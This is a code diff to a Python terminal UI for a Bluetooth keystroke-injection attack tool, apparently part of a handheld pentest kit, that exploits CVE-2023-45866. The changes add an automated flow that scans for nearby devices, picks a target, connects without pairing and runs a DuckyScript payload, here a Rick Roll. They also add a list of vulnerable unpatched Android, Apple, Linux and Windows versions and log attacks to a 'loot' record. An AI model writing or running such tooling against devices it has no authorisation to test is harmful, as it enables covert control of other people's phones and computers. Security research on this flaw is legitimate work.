@@ -559,19 +559,22 @@ class BlueDuckyScreen(urwid.WidgetWrap):
         self._keys_sent = 0
 
         self._log = LogViewer(max_lines=200)
-        self._status = urwid.Text(("dim", "  [s]Scan  [c]Connect  [r]RickRoll  [p]Payload  [x]Stop  [esc]Back"))
+        self._status = urwid.Text(("dim", "  [s]Scan  [c]Connect  [r]RickRoll(auto)  [p]Payload  [x]Stop  [esc]Back"))
         self._info = urwid.Text(("warning", "  BlueDucky — idle"))
 
         self._idle_view = urwid.ListBox(urwid.SimpleFocusListWalker([
             urwid.Text(("default",
                         "  BlueDucky — BT HID Injection (CVE-2023-45866)\n\n"
-                        "  Injects keystrokes via Classic Bluetooth.\n"
-                        "  Target must have BT enabled (no pairing needed\n"
-                        "  on unpatched Android < Dec 2023).\n\n"
+                        "  Injects keystrokes via Classic Bluetooth L2CAP.\n"
+                        "  No pairing needed on UNPATCHED devices:\n"
+                        "    - Android before Dec 2023 security patch\n"
+                        "    - macOS/iOS before Dec 2023 update\n"
+                        "    - Linux with unpatched BlueZ\n"
+                        "    - Windows before Jan 2024 patch\n\n"
                         "  Uses uConsole's built-in Bluetooth adapter.\n\n"
                         "  [s] Scan for BT devices\n"
                         "  [c] Connect (enter MAC manually)\n"
-                        "  [r] Rick Roll (scan → connect → play)\n"
+                        "  [r] Rick Roll (auto: scan → pick → connect → play)\n"
                         "  [p] Pick DuckyScript payload\n"
                         "  [x] Stop / disconnect\n")),
         ]))
@@ -631,11 +634,14 @@ class BlueDuckyScreen(urwid.WidgetWrap):
     # Connect
     # ------------------------------------------------------------------
 
-    def _do_connect(self, addr: str, name: str = "") -> None:
+    def _do_connect(self, addr: str, name: str = "",
+                    on_connected=None) -> None:
+        """Connect to target. If on_connected is set, call it after success."""
         self._target_addr = addr
         self._target_name = name or addr
         self._running = True
         self._log.append(f">>> Connecting to {addr}...", "attack_active")
+        self._log.append("  Setting up adapter (may take ~10s)...", "dim")
 
         def _connect_thread():
             try:
@@ -646,12 +652,26 @@ class BlueDuckyScreen(urwid.WidgetWrap):
 
                 _register_hid_profile(log_fn=lambda m: self._log.append(m, "dim"))
 
+                self._log.append(f"  Opening L2CAP to {addr} (timeout 10s)...", "dim")
                 self._client.connect(addr, timeout=10.0)
                 self._log.append(f"  Connected to {addr}!", "success")
-                self._log.append("  Press [r] for Rick Roll or [p] for payload", "dim")
                 self.state.bt_ducky_running = True
                 if self._loot:
                     self._loot.log_attack_event(f"BLUEDUCKY: Connected to {addr}")
+
+                if on_connected:
+                    # Don't clear _running here — callback may start its own work
+                    on_connected()
+                    return
+                else:
+                    self._log.append("  Press [r] for Rick Roll or [p] for payload", "dim")
+            except (TimeoutError, OSError) as e:
+                err_str = str(e)
+                self._log.append(f"  Connection failed: {err_str}", "error")
+                if "timed out" in err_str.lower():
+                    self._log.append("  Target may be patched (CVE-2023-45866)", "warning")
+                    self._log.append("  Works on: Android <Dec 2023, unpatched Linux/macOS", "dim")
+                self._client.close()
             except Exception as e:
                 self._log.append(f"  Connection failed: {e}", "error")
                 self._client.close()
@@ -691,6 +711,63 @@ class BlueDuckyScreen(urwid.WidgetWrap):
                 self._running = False
 
         self._thread = threading.Thread(target=_payload_thread, daemon=True)
+        self._thread.start()
+
+    # ------------------------------------------------------------------
+    # Rick Roll auto-flow: scan → pick → connect → payload
+    # ------------------------------------------------------------------
+
+    def _do_rickroll_auto(self) -> None:
+        """Full auto: scan → show picker → connect → execute Rick Roll."""
+        if self._client.connected:
+            # Already connected — just run the payload
+            self._do_payload(RICKROLL_PAYLOAD, "Rick Roll")
+            return
+
+        self._running = True
+        self._body.original_widget = self._log
+        self._log.append(">>> Rick Roll: scanning for targets...", "attack_active")
+
+        def _scan_then_pick():
+            devices = _scan_bt_devices(duration=8, log_fn=lambda m: self._log.append(m, "dim"))
+            self._scanned_devices = devices
+            self._running = False
+
+            if not devices:
+                self._log.append("  No devices found", "warning")
+                return
+
+            self._log.append(f"  Found {len(devices)} device(s):", "success")
+            for i, (addr, name) in enumerate(devices):
+                self._log.append(f"  {i+1}. {addr}  {name or '(unknown)'}", "default")
+
+            # Show picker dialog on main thread
+            choices = [f"{name or '(unknown)'}  {addr}" for addr, name in devices]
+
+            def on_pick(idx):
+                self._app.dismiss_overlay()
+                if idx is None:
+                    self._log.append("  Cancelled", "dim")
+                    return
+                addr, name = devices[idx]
+                self._log.append(f"  Selected: {addr} ({name or '?'})", "default")
+
+                def _fire_rickroll():
+                    self._do_payload(RICKROLL_PAYLOAD, "Rick Roll")
+
+                self._do_connect(addr, name, on_connected=_fire_rickroll)
+
+            # Schedule dialog on main loop
+            try:
+                self._app.loop.set_alarm_in(0, lambda *_: self._app.show_overlay(
+                    ChoiceDialog("Rick Roll target:", choices, on_pick),
+                    55, min(len(choices) + 6, 16),
+                ))
+            except Exception:
+                # Fallback: just prompt to press 1-9
+                self._log.append("  Press [1-9] to select target, then [r] again", "dim")
+
+        self._thread = threading.Thread(target=_scan_then_pick, daemon=True)
         self._thread.start()
 
     # ------------------------------------------------------------------
@@ -749,10 +826,8 @@ class BlueDuckyScreen(urwid.WidgetWrap):
                 return None
 
         if key == "r":
-            if self._client.connected:
-                self._do_payload(RICKROLL_PAYLOAD, "Rick Roll")
-            else:
-                self._log.append("  Connect to a device first ([s] scan, [c] connect)", "warning")
+            if not self._running:
+                self._do_rickroll_auto()
             return None
 
         if key == "p":
